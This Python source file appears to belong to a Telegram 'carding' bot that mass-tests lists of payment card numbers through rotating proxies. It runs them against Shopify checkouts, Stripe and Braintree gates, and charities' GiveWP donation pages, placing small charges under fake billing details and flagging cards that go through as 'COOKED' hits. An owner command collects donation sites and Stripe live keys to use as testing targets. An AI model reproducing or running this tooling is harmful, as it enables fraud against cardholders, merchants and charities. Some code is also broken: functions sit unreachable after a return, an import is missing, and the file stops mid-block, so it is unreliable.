import requests
import time
import threading
import random
import logging
import re
import csv
import os
import urllib3
import traceback
import json
import gates  # our new gates.py
from concurrent.futures import ThreadPoolExecutor, as_completed
from telebot import types
import autosh

OWNER_ID = [5963548505, 1614278744]

USER_PROXIES_FILE = "user_proxies.json"

def load_user_proxies():
    if os.path.exists(USER_PROXIES_FILE):
        with open(USER_PROXIES_FILE, 'r') as f:
            return json.load(f)
    return {}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

user_sessions = {}
BINS_CSV_FILE = 'bins_all.csv'
MAX_RETRIES = 2
PROXY_TIMEOUT = 5
BIN_DB = {}
# Temporary storage for /stsite file content
pending_stsite = {}


def load_bin_database():
    global BIN_DB
    if not os.path.exists(BINS_CSV_FILE):
        logger.warning(f"⚠️ System: BIN CSV file '{BINS_CSV_FILE}' not found.")
        return
    try:
        with open(BINS_CSV_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            reader = csv.reader(f)
            next(reader, None)
            for row in reader:
                if len(row) >= 6:
                    BIN_DB[row[0].strip()] = {
                        'country_name': row[1].strip(),
                        'country_flag': get_flag_emoji(row[1].strip()),
                        'brand': row[2].strip(),
                        'type': row[3].strip(),
                        'level': row[4].strip(),
                        'bank': row[5].strip()
                    }
    except Exception as e:
        logger.error(f"❌ Error loading BIN CSV: {e}")

def get_flag_emoji(country_code):
    if not country_code or len(country_code) != 2: return "🇺🇳"
    return "".join([chr(ord(c.upper()) + 127397) for c in country_code])

load_bin_database()

def get_bin_info(card_number):
    clean_cc = re.sub(r'\D', '', str(card_number))
    bin_code = clean_cc[:6]
    if bin_code in BIN_DB: return BIN_DB[bin_code]
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=3)
        if response.status_code == 200:
            data = response.json()
            return {
                'country_name': data.get('country_name', 'Unknown'),
                'country_flag': data.get('country_flag', '🇺🇳'),
                'brand': data.get('brand', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'level': data.get('level', 'Unknown'),
                'bank': data.get('bank', 'Unknown')
            }
    except: pass
    return {'country_name': 'Unknown', 'country_flag': '🇺🇳', 'bank': 'UNKNOWN', 'brand': 'UNKNOWN', 'type': 'UNKNOWN', 'level': 'UNKNOWN'}

def extract_cards_from_text(text):
    valid_ccs = []
    text = text.replace(',', '\n').replace(';', '\n')
    lines = text.split('\n')
    for line in lines:
        line = line.strip()
        if len(line) < 15: continue
        match = re.search(r'(\d{13,19})[|:/\s](\d{1,2})[|:/\s](\d{2,4})[|:/\s](\d{3,4})', line)
        if match:
            cc, mm, yyyy, cvv = match.groups()
            if len(yyyy) == 2: yyyy = "20" + yyyy
            mm = mm.zfill(2)
            if 1 <= int(mm) <= 12:
                valid_ccs.append(f"{cc}|{mm}|{yyyy}|{cvv}")
    return list(set(valid_ccs))

def create_progress_bar(processed, total, length=15):
    if total == 0: return ""
    percent = processed / total
    filled_length = int(length * percent)
    return f"<code>{'█' * filled_length}{'░' * (length - filled_length)}</code> {int(percent * 100)}%"

def validate_proxies_strict(proxies, bot, message):
    live_proxies = []
    total = len(proxies)
    status_msg = bot.reply_to(message, f"🛡️ <b>Verifying {total} Proxies...</b>", parse_mode='HTML')
    last_ui_update = time.time()
    checked = 0

    def check(proxy_str):
        try:
            parts = proxy_str.split(':')
            if len(parts) == 2: url = f"http://{parts[0]}:{parts[1]}"
            elif len(parts) == 4: url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            else: return False
            requests.get("http://httpbin.org/ip", proxies={'http': url, 'https': url}, timeout=PROXY_TIMEOUT)
            return True
        except: return False

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(check, p): p for p in proxies}
        for future in as_completed(futures):
            checked += 1
            if future.result(): live_proxies.append(futures[future])
            if time.time() - last_ui_update > 2:
                try:
                    bot.edit_message_text(f"🛡️ <b>Verifying Proxies</b>\n✅ Live: {len(live_proxies)}\n💀 Dead: {checked - len(live_proxies)}\n📊 {checked}/{total}", message.chat.id, status_msg.message_id, parse_mode='HTML')
                    last_ui_update = time.time()
                except: pass

    try: bot.delete_message(message.chat.id, status_msg.message_id)
    except: pass
    return live_proxies

# ============================================================================
# 🔧 WRAPPER FOR SHOPIFY (using autosh)
# ============================================================================
def check_site_shopify_direct(site_url, cc, proxy=None):
    try:
        result_json = autosh.ShopProcessor().process(cc, site_url, proxy)
        result = json.loads(result_json)
        response_text = result.get('Response', 'Unknown')
        price = result.get('Price', '0.00')
        gateway = result.get('Gateway', 'Shopify Full Flow')

        response_upper = response_text.upper()
        if 'THANK YOU FOR YOUR PURCHASE' in response_upper or 'ORDER PLACED' in response_upper:
            status = 'APPROVED'
        elif 'INCORRECT_ZIP' in response_upper:
            status = 'DECLINED'
        elif 'INSUFFICIENT_FUNDS' in response_upper:
            status = 'DECLINED'
        elif 'INCORRECT_CVC' in response_upper:
            status = 'DECLINED'
        elif '3DS' in response_upper or 'ACTION_REQUIRED' in response_upper:
            status = 'APPROVED_OTP'
        elif 'CAPTCHA' in response_upper:
            status = 'ERROR'
        elif 'NO_PAYMENT_ID' in response_upper:
            status = 'DECLINED'
        elif 'TOKENIZATION FAILED' in response_upper:
            status = 'ERROR'
        else:
            decline_keywords = ['DECLINED', 'CARD DECLINED', 'EXPIRED', 'FRAUD', 'DO NOT HONOR']
            if any(k in response_upper for k in decline_keywords):
                status = 'DECLINED'
            else:
                status = 'UNKNOWN'

        return {
            'Response': response_text,
            'status': status,
            'gateway': gateway,
            'price': price,
            'message': response_text
        }
    except Exception as e:
        return {
            'Response': f'Error: {str(e)}',
            'status': 'ERROR',
            'gateway': 'Shopify Full Flow',
            'price': '0.00',
            'message': str(e)
        }

# ============================================================================
# 🚀 MAIN HANDLER SETUP
# ============================================================================
def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                          check_site_func, is_valid_response_func,
                          process_response_func, update_stats_func, save_json_func,
                          is_user_allowed_func):

    @bot.message_handler(content_types=['document'])
    def handle_file_upload_event(message):
        if not is_user_allowed_func(message.from_user.id):
            bot.reply_to(message, "🚫 <b>Access Denied:</b> Contact Admin.", parse_mode='HTML')
            return

        try:
            file_name = message.document.file_name.lower()
            if not file_name.endswith('.txt'):
                bot.reply_to(message, "❌ <b>Format Error:</b> Only .txt files.", parse_mode='HTML')
                return

            msg_loading = bot.reply_to(message, "⏳ <b>Reading File...</b>", parse_mode='HTML')

            file_info = bot.get_file(message.document.file_id)
            file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')

            ccs = extract_cards_from_text(file_content)

            if ccs:
                user_id = message.from_user.id
                if user_id not in user_sessions: user_sessions[user_id] = {}
                user_sessions[user_id]['ccs'] = ccs
                user_sessions[user_id]['proxies'] = []

                markup = types.InlineKeyboardMarkup(row_width=1)
                markup.add(
                    types.InlineKeyboardButton("🛍️ Shopify Mass (Multi-Site)", callback_data="run_mass_shopify"),
                    types.InlineKeyboardButton("💳 Stripe Auth (ConfigDB)", callback_data="run_mass_stripe_configdb"),
                    types.InlineKeyboardButton("💰 Braintree $50", callback_data="run_mass_braintree"),
                    types.InlineKeyboardButton("💳 Stripe Donation (Multi)", callback_data="run_mass_stripe_donation"),
                    types.InlineKeyboardButton("❌ Cancel", callback_data="action_cancel")
                )

                bot.edit_message_text(
                    f"📂 <b>File:</b> <code>{file_name}</code>\n"
                    f"💳 <b>Cards:</b> {len(ccs)}\n"
                    f"<b>⚡ Select Checking Gate:</b>",
                    message.chat.id, msg_loading.message_id, reply_markup=markup, parse_mode='HTML'
                )
            else:
                proxies = [line.strip() for line in file_content.split('\n') if ':' in line]
                if proxies:
                    user_id = message.from_user.id
                    if user_id not in user_sessions: user_sessions[user_id] = {}
                    user_sessions[user_id]['proxies'] = proxies
                    bot.edit_message_text(f"🔌 <b>Proxies Loaded:</b> {len(proxies)}\n✅ You can now run Mass Check.", message.chat.id, msg_loading.message_id, parse_mode='HTML')
                else:
                    bot.edit_message_text("❌ No valid CCs or Proxies found.", message.chat.id, msg_loading.message_id)

        except Exception as e:
            bot.reply_to(message, f"❌ Error: {e}")

    @bot.message_handler(commands=['msh', 'hardcook'])
    def handle_mass_check_command(message):
        if not is_user_allowed_func(message.from_user.id):
            bot.send_message(message.chat.id, "🚫 <b>Access Denied</b>", parse_mode='HTML')
            return

        user_id = message.from_user.id
        if user_id not in user_sessions or 'ccs' not in user_sessions[user_id] or not user_sessions[user_id]['ccs']:
            bot.send_message(message.chat.id, "⚠️ <b>Upload CCs first!</b>", parse_mode='HTML')
            return

        ccs = user_sessions[user_id]['ccs']
        sites = get_filtered_sites_func()

        if not sites:
            bot.send_message(message.chat.id, "❌ <b>No sites available!</b> Add sites via /addurls", parse_mode='HTML')
            return

        active_proxies = []
        user_proxies = user_sessions[user_id].get('proxies', [])

        if user_proxies:
            active_proxies = validate_proxies_strict(user_proxies, bot, message)
            source = f"🔒 User ({len(active_proxies)})"
        else:
            server_proxies = proxies_data.get('proxies', [])
            if server_proxies:
                active_proxies = server_proxies
                source = f"🌍 Server ({len(active_proxies)})"
            else:
                bot.send_message(message.chat.id, "❌ <b>No Proxies Available!</b> Upload proxies or add server proxies.", parse_mode='HTML')
                return

        if not active_proxies:
            bot.send_message(message.chat.id, "❌ <b>All Proxies Dead.</b>", parse_mode='HTML')
            return

        start_msg = bot.send_message(message.chat.id, f"🔥 <b>Starting...</b>\n💳 {len(ccs)} Cards\n🔌 {source}", parse_mode='HTML')

        threading.Thread(
            target=process_mass_check_engine,
            args=(bot, message, start_msg, ccs, sites, active_proxies,
                  check_site_func, process_response_func, update_stats_func)
        ).start()

    # ==========================================================================
    # HELPER FUNCTIONS INSIDE SETUP_COMPLETE_HANDLER
    # ==========================================================================
    def get_active_proxies(user_id):
        user_id = str(user_id)
        if int(user_id) in user_sessions and user_sessions[int(user_id)].get('proxies'):
            return user_sessions[int(user_id)]['proxies']
        saved_proxies = load_user_proxies()
        if user_id in saved_proxies and saved_proxies[user_id]:
            return saved_proxies[user_id]
        if int(user_id) in OWNER_ID:
            if proxies_data and 'proxies' in proxies_data and proxies_data['proxies']:
                return proxies_data['proxies']
        return None

    # ==========================================================================
    # CALLBACK HANDLERS
    # ==========================================================================
    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_shopify")
    def callback_shopify(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            user_id = call.from_user.id
            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                return

            proxies = get_active_proxies(user_id)
            if not proxies:
                bot.send_message(
                    call.message.chat.id,
                    "🚫 <b>Proxy Required!</b>\n\n"
                    "You have 0 proxies in your pool.\n"
                    "<b>To add proxies:</b>\n"
                    "1. Upload a <code>.txt</code> file\n"
                    "2. OR use <code>/addpro ip:port:user:pass</code>",
                    parse_mode='HTML'
                )
                return

            process_mass_check_engine(
                bot, call.message, None,
                user_sessions[user_id]['ccs'],
                get_filtered_sites_func(),
                proxies,
                check_site_shopify_direct,
                process_response_func,
                update_stats_func
            )
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_stripe_configdb")
    def callback_stripe_configdb(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            user_id = call.from_user.id
            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                return

            proxies = get_active_proxies(user_id)
            if not proxies:
                bot.send_message(call.message.chat.id, "🚫 Proxy Required!", parse_mode='HTML')
                return

            process_mass_gate_check(
                bot, call.message,
                user_sessions[user_id]['ccs'],
                gates.check_stripe_configdb,
                "Stripe Auth (ConfigDB)",
                proxies
            )
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_braintree")
    def callback_braintree(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            user_id = call.from_user.id
            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                return

            proxies = get_active_proxies(user_id)
            if not proxies:
                bot.send_message(call.message.chat.id, "🚫 Proxy Required!", parse_mode='HTML')
                return

            process_mass_gate_check(
                bot, call.message,
                user_sessions[user_id]['ccs'],
                gates.check_braintree,
                "Braintree $50",
                proxies
            )
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_stripe_donation")
    def callback_stripe_donation(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            user_id = call.from_user.id
            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                return

            proxies = get_active_proxies(user_id)
            if not proxies:
                bot.send_message(call.message.chat.id, "🚫 Proxy Required!", parse_mode='HTML')
                return

            process_mass_gate_check(
                bot, call.message,
                user_sessions[user_id]['ccs'],
                gates.check_stripe_donation,
                "Stripe Donation (Multi)",
                proxies
            )
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "action_cancel")
    def callback_cancel(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.send_message(call.message.chat.id, "❌ Operation cancelled.")
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

        # ============================================================================
    # 📥 COMMAND: /stsite - Upload and test Stripe Donation Sites (working version)
    # ============================================================================
    @bot.message_handler(commands=['stsite'])
    def handle_stsite_command(message):
        if message.from_user.id not in OWNER_ID:
            bot.reply_to(message, "🚫 Owner only command.")
            return

        bot.reply_to(
            message,
            "📤 **Send a .txt file** containing Stripe donation sites.\n"
            "Each line can have extra text, as long as it contains a URL and a `pk_live_...` key.\n"
            "Example: `https://example.com/donate | pk_live_abc123`\n"
            "I will extract them automatically and test them with a card.",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(message, process_stsite_file)

    def process_stsite_file(message):
        if not message.document or not message.document.file_name.endswith('.txt'):
            bot.reply_to(message, "❌ Please send a **.txt** file.")
            return

        try:
            file_info = bot.get_file(message.document.file_id)
            file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')

            candidates = []
            lines = file_content.split('\n')
            for line in lines:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                # Flexible regex: look for a URL and a pk_live string
                match = re.search(r'(https?://[^\s|]+).*?(pk_live_[a-zA-Z0-9]+)', line, re.IGNORECASE)
                if match:
                    url = match.group(1).rstrip('/')
                    pk = match.group(2)
                    candidates.append({'url': url, 'pk': pk})

            if not candidates:
                bot.reply_to(message, "❌ No valid URL+PK pairs found in the file.")
                return

            # Store candidates temporarily
            user_id = message.from_user.id
            if not hasattr(bot, 'pending_stsite'):
                bot.pending_stsite = {}
            bot.pending_stsite[user_id] = candidates

            bot.reply_to(
                message,
                f"✅ Extracted **{len(candidates)}** potential sites.\n"
                f"Now send me a **test card** (format: `CC|MM|YYYY|CVV`) to validate them.\n"
                f"Example: `5154620020023386|10|2027|840`",
                parse_mode='Markdown'
            )
            bot.register_next_step_handler(message, process_test_card)

        except Exception as e:
            bot.reply_to(message, f"❌ Error reading file: {str(e)}")

    def process_test_card(message):
        user_id = message.from_user.id
        if not hasattr(bot, 'pending_stsite') or user_id not in bot.pending_stsite:
            bot.reply_to(message, "❌ No pending sites. Please start over with /stsite.")
            return

        test_cc = message.text.strip()
        # Basic format check
        if not re.match(r'\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}', test_cc):
            bot.reply_to(message, "❌ Invalid card format. Use `CC|MM|YYYY|CVV`", parse_mode='Markdown')
            return

        candidates = bot.pending_stsite[user_id]
        total = len(candidates)
        working = []
        failed = []

        status_msg = bot.reply_to(message, f"🔄 Testing {total} sites with your card... This may take a while.", parse_mode='HTML')

        # Use a random proxy if available
        proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None

        for idx, site in enumerate(candidates, 1):
            url = site['url']
            pk = site['pk']
            try:
                # Update status every 5 sites
                if idx % 5 == 0 or idx == total:
                    bot.edit_message_text(
                        f"🔄 Testing sites... {idx}/{total}\n"
                        f"✅ Working: {len(working)}\n"
                        f"❌ Failed: {len(failed)}",
                        message.chat.id, status_msg.message_id
                    )

                # Use the same logic as the working test script
                result = test_donation_site_like_script(url, pk, test_cc, proxy)
                if result == "Charge ✅":
                    working.append(site)
                else:
                    failed.append(f"{url} ({result})")
            except Exception as e:
                failed.append(f"{url} (error: {str(e)[:50]})")

        # Save only working sites
        donation_file = "donation_sites.json"
        if os.path.exists(donation_file):
            with open(donation_file, 'r') as f:
                existing = json.load(f)
        else:
            existing = []

        # Add new working sites (avoid duplicates)
        added = 0
        for site in working:
            if not any(s['url'] == site['url'] for s in existing):
                existing.append({
                    'url': site['url'],
                    'pk': site['pk'],
                    'type': 'givewp'
                })
                added += 1

        with open(donation_file, 'w') as f:
            json.dump(existing, f, indent=2)

        # Clean up pending data
        del bot.pending_stsite[user_id]

        # Final report
        report = (
            f"✅ **Testing Complete**\n\n"
            f"📊 Total candidates: {total}\n"
            f"✅ Working: {len(working)}\n"
            f"❌ Failed: {len(failed)}\n"
            f"🆕 Added to database: {added}\n\n"
        )
        if failed:
            report += "**Failed sites (first 10):**\n" + "\n".join(failed[:10])
            if len(failed) > 10:
                report += f"\n... and {len(failed)-10} more"

        bot.edit_message_text(report, message.chat.id, status_msg.message_id, parse_mode='Markdown')

# ----------------------------------------------------------------------------
# Helper function that replicates the working test script's logic
# ----------------------------------------------------------------------------
def test_donation_site_like_script(site_url, pk, cc, proxy=None):
    """
    Attempt a full donation on a site using the same flow as the working test script.
    Returns "Charge ✅" if successful, otherwise the error/decline message.
    """
    try:
        # Parse card
        parts = re.split(r'[ |/]', cc)
        if len(parts) < 4:
            return "Invalid card format"
        c, mm, ex, cvc = parts[0], parts[1], parts[2], parts[3]

        # Process expiry year (same as test script)
        try:
            yy = ex[2] + ex[3]
            if '2' in ex[3] or '1' in ex[3]:
                yy = ex[2] + '7'
        except:
            yy = ex[0] + ex[1]
            if '2' in ex[1] or '1' in ex[1]:
                yy = ex[0] + '7'

        session = requests.Session()
        session.verify = False
        if proxy:
            formatted = gates.format_proxy(proxy)
            if formatted:
                session.proxies = formatted

        ua = user_agent.generate_user_agent()
        headers = {'user-agent': ua}
        donate_url = site_url if site_url.endswith('/donate') else site_url.rstrip('/') + '/donate/'

        # Get donation page
        r = session.get(donate_url, headers=headers, timeout=20)
        time.sleep(3)

        # Extract form data
        ssa = re.search(r'name="give-form-hash" value="(.*?)"', r.text).group(1)
        ssa00 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text).group(1)
        ss000a00 = re.search(r'name="give-form-id" value="(.*?)"', r.text).group(1)

        # First AJAX request to initiate donation
        headers_ajax = {
            'origin': site_url,
            'referer': donate_url,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': ua,
            'x-requested-with': 'XMLHttpRequest',
        }
        data_init = {
            'give-honeypot': '',
            'give-form-id-prefix': ssa00,
            'give-form-id': ss000a00,
            'give-form-title': 'Give a Donation',
            'give-current-url': donate_url,
            'give-form-url': donate_url,
            'give-form-minimum': '5.00',
            'give-form-maximum': '999999.99',
            'give-form-hash': ssa,
            'give-price-id': 'custom',
            'give-amount': '5.00',
            'give_tributes_type': 'DrGaM Of',
            'give_tributes_show_dedication': 'no',
            'give_tributes_radio_type': 'In Honor Of',
            'give_tributes_first_name': '',
            'give_tributes_last_name': '',
            'give_tributes_would_to': 'send_mail_card',
            'give-tributes-mail-card-personalized-message': '',
            'give_tributes_mail_card_notify_first_name': '',
            'give_tributes_mail_card_notify_last_name': '',
            'give_tributes_address_country': 'US',
            'give_tributes_mail_card_address_1': '',
            'give_tributes_mail_card_address_2': '',
            'give_tributes_mail_card_city': '',
            'give_tributes_address_state': 'MI',
            'give_tributes_mail_card_zipcode': '',
            'give_stripe_payment_method': '',
            'payment-mode': 'stripe',
            'give_first': 'drgam ',
            'give_last': 'drgam ',
            'give_email': 'lolipnp@gmail.com',
            'give_comment': '',
            'card_name': 'drgam ',
            'billing_country': 'US',
            'card_address': 'drgam sj',
            'card_address_2': '',
            'card_city': 'tomrr',
            'card_state': 'NY',
            'card_zip': '10090',
            'give_action': 'purchase',
            'give-gateway': 'stripe',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }
        session.post(f"{site_url}/wp-admin/admin-ajax.php", headers=headers_ajax, data=data_init, timeout=20)

        # Create Stripe payment method
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': ua,
        }
        stripe_data = f'type=card&billing_details[name]=drgam++drgam+&billing_details[email]=lolipnp%40gmail.com&billing_details[address][line1]=drgam+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d03370a&muid=3b562720-d431-4fa4-b092-278d4639a6f3fd765e&sid=70a0ddd2-988f-425f-9996-372422a311c454628a&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer=https%3A%2F%2Fhigherhopesdetroit.org&time_on_page=85758&client_attribution_metadata[client_session_id]=c0e497a5-78ba-4056-9d5d-0281586d897a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key={pk}&_stripe_account=acct_1C1iK1I8d9CuLOBr&radar_options'
        e = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=20)
        payment_id = e.json().get('id')
        if not payment_id:
            return "Failed to create payment method"

        # Final donation submission
        headers_final = {
            'authority': site_url.replace('https://', ''),
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': site_url,
            'referer': donate_url,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': ua,
        }
        params = {'payment-mode': 'stripe', 'form-id': ss000a00}
        data_final = {
            'give-honeypot': '',
            'give-form-id-prefix': ssa00,
            'give-form-id': ss000a00,
            'give-form-title': 'Give a Donation',
            'give-current-url': donate_url,
            'give-form-url': donate_url,
            'give-form-minimum': '5.00',
            'give-form-maximum': '999999.99',
            'give-form-hash': ssa,
            'give-price-id': 'custom',
            'give-amount': '5.00',
            'give_tributes_type': 'In Honor Of',
            'give_tributes_show_dedication': 'no',
            'give_tributes_radio_type': 'Drgam Of',
            'give_tributes_first_name': '',
            'give_tributes_last_name': '',
            'give_tributes_would_to': 'send_mail_card',
            'give-tributes-mail-card-personalized-message': '',
            'give_tributes_mail_card_notify_first_name': '',
            'give_tributes_mail_card_notify_last_name': '',
            'give_tributes_address_country': 'US',
            'give_tributes_mail_card_address_1': '',
            'give_tributes_mail_card_address_2': '',
            'give_tributes_mail_card_city': '',
            'give_tributes_address_state': 'MI',
            'give_tributes_mail_card_zipcode': '',
            'give_stripe_payment_method': payment_id,
            'payment-mode': 'stripe',
            'give_first': 'drgam ',
            'give_last': 'drgam ',
            'give_email': 'lolipnp@gmail.com',
            'give_comment': '',
            'card_name': 'drgam ',
            'billing_country': 'US',
            'card_address': 'drgam sj',
            'card_address_2': '',
            'card_city': 'tomrr',
            'card_state': 'NY',
            'card_zip': '10090',
            'give_action': 'purchase',
            'give-gateway': 'stripe',
        }
        r4 = session.post(donate_url, params=params, headers=headers_final, data=data_final, timeout=20)
        text = r4.text
        if 'Your card was declined.' in text:
            return "card_declined"
        elif 'Your card has insufficient funds.' in text:
            return "insufficient_funds"
        elif 'Thank you' in text or 'Thank you for your donation' in text or 'succeeded' in text or 'true' in text or 'success' in text:
            return "Charge ✅"
        elif 'Your card number is incorrect.' in text:
            return "incorrect_CVV2"
        else:
            return "Card_reject"
    except Exception as e:
        return f"Error: {str(e)}"
    # ============================================================================
    # 🧠 MASS CHECK ENGINE
    # ============================================================================
    def process_mass_check_engine(bot, message, status_msg, ccs, sites, proxies, check_site_func, process_response_func, update_stats_func):
        results = {'cooked': [], 'approved': [], 'declined': [], 'error': []}
        total = len(ccs)
        processed = 0
        start_time = time.time()
        last_update_time = time.time()

        def worker(cc):
            attempts = 0
            while attempts < MAX_RETRIES:
                try:
                    site = random.choice(sites)
                    proxy = random.choice(proxies)
                    api_response = check_site_func(site['url'], cc, proxy)

                    if not api_response:
                        attempts += 1; continue

                    resp_text, status, gateway = process_response_func(api_response, site.get('price', '0'))

                    if any(x in resp_text.upper() for x in ["PROXY", "TIMEOUT", "CAPTCHA"]):
                        attempts += 1; continue

                    return {'cc': cc, 'status': status, 'response': resp_text, 'gateway': gateway, 'price': site.get('price', '0'), 'site_url': site['url']}
                except: attempts += 1
            return {'cc': cc, 'status': 'ERROR', 'response': 'Dead/Timeout', 'gateway': 'Unknown', 'price': '0', 'site_url': 'N/A'}

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(worker, cc): cc for cc in ccs}
            for future in as_completed(futures):
                processed += 1
                res = future.result()

                if res['status'] == 'APPROVED':
                    if any(x in res['response'].upper() for x in ["THANK", "CONFIRMED", "SUCCESS"]):
                        results['cooked'].append(res)
                        update_stats_func('COOKED', True)
                        send_hit(bot, message.chat.id, res, "🔥 COOKED")
                    else:
                        results['approved'].append(res)
                        update_stats_func('APPROVED', True)
                        send_hit(bot, message.chat.id, res, "✅ APPROVED")
                elif res['status'] == 'APPROVED_OTP':
                    results['approved'].append(res)
                    update_stats_func('APPROVED_OTP', True)
                    send_hit(bot, message.chat.id, res, "✅ APPROVED (OTP)")
                elif res['status'] == 'DECLINED':
                    results['declined'].append(res)
                    update_stats_func('DECLINED', True)
                else:
                    results['error'].append(res)

                if time.time() - last_update_time > 3 or processed == total:
                    update_ui(bot, message.chat.id, status_msg.message_id, processed, total, results)
                    last_update_time = time.time()

        duration = time.time() - start_time
        send_final(bot, message.chat.id, status_msg.message_id, total, results, duration)

    def process_mass_gate_check(bot, message, ccs, gate_func, gate_name, proxies):
        total = len(ccs)
        results = {'cooked': [], 'approved': [], 'declined': [], 'error': []}

        try:
            status_msg = bot.send_message(
                message.chat.id,
                f"🔥 <b>{gate_name} Started...</b>\n"
                f"💳 Cards: {total}\n"
                f"🔌 Proxies: {len(proxies)}",
                parse_mode='HTML'
            )
        except:
            status_msg = bot.send_message(message.chat.id, f"🔥 <b>{gate_name} Started...</b>", parse_mode='HTML')

        processed = 0
        start_time = time.time()
        last_update = time.time()

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {}
            for cc in ccs:
                proxy = random.choice(proxies)
                futures[executor.submit(gate_func, cc, proxy)] = cc

            for future in as_completed(futures):
                cc = futures[future]
                processed += 1

                try:
                    response_text, status = future.result()

                    res_obj = {
                        'cc': cc,
                        'response': response_text,
                        'status': status,
                        'gateway': gate_name,
                        'price': 'N/A',
                        'site_url': 'API'
                    }

                    if status == 'APPROVED':
                        results['cooked'].append(res_obj)
                        send_hit(bot, message.chat.id, res_obj, f"✅ {gate_name} HIT")
                    elif status == 'APPROVED_OTP':
                        results['approved'].append(res_obj)
                        send_hit(bot, message.chat.id, res_obj, f"⚠️ {gate_name} AUTH")
                    elif status == 'DECLINED':
                        results['declined'].append(res_obj)
                    else:
                        results['error'].append(res_obj)

                    if time.time() - last_update > 3:
                        msg = (
                            f"⚡ <b>{gate_name} Checking...</b>\n"
                            f"{create_progress_bar(processed, total)}\n"
                            f"<b>Progress:</b> {processed}/{total}\n"
                            f"✅ <b>Live:</b> {len(results['cooked'])}\n"
                            f"❌ <b>Dead:</b> {len(results['declined'])}\n"
                            f"⚠️ <b>Error:</b> {len(results['error'])}"
                        )
                        try:
                            bot.edit_message_text(msg, message.chat.id, status_msg.message_id, parse_mode='HTML')
                            last_update = time.time()
                        except: pass

                except Exception as e:
                    print(f"Check Error for {cc}: {e}")
                    results['error'].append({'cc': cc, 'response': str(e), 'status': 'ERROR'})

        duration = time.time() - start_time
        final_msg = (
            f"✅ <b>{gate_name} Completed</b>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"💳 <b>Total:</b> {total}\n"
            f"✅ <b>Live:</b> {len(results['cooked'])}\n"
            f"❌ <b>Dead:</b> {len(results['declined'])}\n"
            f"⚠️ <b>Errors:</b> {len(results['error'])}\n"
            f"⏱️ <b>Time:</b> {duration:.2f}s"
        )

        try:
            bot.edit_message_text(final_msg, message.chat.id, status_msg.message_id, parse_mode='HTML')
        except:
